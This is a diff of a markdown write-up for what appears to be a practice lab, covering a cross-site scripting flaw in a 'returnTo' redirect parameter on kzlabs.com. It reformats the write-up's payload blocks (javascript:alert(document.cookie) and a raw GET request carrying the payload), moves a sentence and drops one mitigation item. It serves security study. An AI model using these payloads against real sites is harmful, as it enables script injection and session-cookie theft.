@@ -25,15 +25,17 @@ https://kzlabs.com/57.php?returnTo=javascript:alert(101)
 
 ## Payload Used
 
-html
-javascript:alert(document.cookie)
+`html
+javascript:alert(document.cookie)`
 
 Alternative Payload:
 
-html
-javascript:alert(101)
+`html
+javascript:alert(101)`
 
 # Proof of Concept
+This confirms that arbitrary HTML and JavaScript can be injected and executed persistently.
+
 ## Screenshot 1 — Payload submitted successfully into the vulnerable field
 
 ![Payload Submission](screenshots/lab57.1.png)
@@ -46,11 +48,11 @@ javascript:alert(101)
 
 ![Stored XSS Execution](screenshots/lab57.3.png)
 
-This confirms that arbitrary HTML and JavaScript can be injected and executed persistently.
 
-http
+```http
 GET /57.php?returnTo=javascript:alert(101) HTTP/1.1
 Host: kzlabs.com
+```
 
 ## Impact
 
@@ -72,6 +74,4 @@ Host: kzlabs.com
 3. Allow only trusted internal URLs or predefined redirect paths.
 
 4. Implement proper output encoding and input validation.
-
-5. Use Content Security Policy (CSP) for additional protection against JavaScript injection attacks.
 
